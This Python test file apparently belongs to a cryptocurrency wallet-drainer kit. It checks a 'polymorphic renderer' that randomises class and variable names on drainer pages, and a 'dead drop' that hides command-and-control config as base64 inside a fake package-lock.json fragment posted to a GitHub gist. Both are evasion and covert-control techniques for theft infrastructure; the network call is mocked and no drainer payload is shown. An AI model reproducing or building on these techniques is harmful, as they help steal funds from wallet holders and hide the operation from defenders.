# tests/test_infra_units.py — polymorphic renderer determinism + dead drop round trip
import base64
import json

from core.deaddrop import DeadDrop
from core.polymorphic_renderer import PolymorphicRenderer


# ── polymorphic renderer ────────────────────────────────────────────────────

def test_renderer_same_seed_same_output():
    a = PolymorphicRenderer(seed="deadbeef" * 4)
    b = PolymorphicRenderer(seed="deadbeef" * 4)
    html_a = a.render_drainer.__self__ is not None  # noqa — just touch instance
    assert a.seed == b.seed
    # class/var maps build lazily and identically
    assert a._gen_class_name("connect-btn") == b._gen_class_name("connect-btn")
    assert a._gen_var_name("ethereum") == b._gen_var_name("ethereum")
    # same name → stable mapping within a deployment
    assert a._gen_class_name("connect-btn") == a._gen_class_name("connect-btn")


def test_renderer_different_seed_different_output():
    a = PolymorphicRenderer(seed="a" * 16)
    b = PolymorphicRenderer(seed="b" * 16)
    names_a = [a._gen_class_name(f"cls-{i}") for i in range(10)]
    names_b = [b._gen_class_name(f"cls-{i}") for i in range(10)]
    assert names_a != names_b


def test_renderer_names_are_valid_identifiers():
    r = PolymorphicRenderer(seed="c" * 16)
    for i in range(20):
        cls = r._gen_class_name(f"c{i}")
        var = r._gen_var_name(f"v{i}")
        assert cls.replace("-", "").isalnum(), cls
        assert var.isidentifier(), var


# ── dead drop round trip (mocked gist transport) ──────────────────────────

class FakeGistResponse:
    def __init__(self, payload):
        self._payload = payload
        self.ok = True

    def raise_for_status(self):
        pass

    def json(self):
        return self._payload


def test_deaddrop_roundtrip(monkeypatch):
    sent = {}

    def fake_patch(url, headers=None, json=None):
        sent["content"] = json["files"]["package-lock.json"]["content"]
        return FakeGistResponse({"ok": True})

    monkeypatch.setattr("core.deaddrop.requests.patch", fake_patch)
    drop = DeadDrop(gist_token="t", gist_id="g")

    config = {
        "v": 2,
        "endpoints": {"api": "https://example.vercel.app/api"},
        "key": "abc123",
    }
    drop.update(config)

    # gist content looks like a package-lock fragment
    gist_json = json.loads(sent["content"])
    assert gist_json["name"] == "cloudsync-sdk"
    assert "integrity" in gist_json

    # and decodes back to the exact config
    decoded = json.loads(base64.b64decode(gist_json["integrity"]))
    assert decoded == config
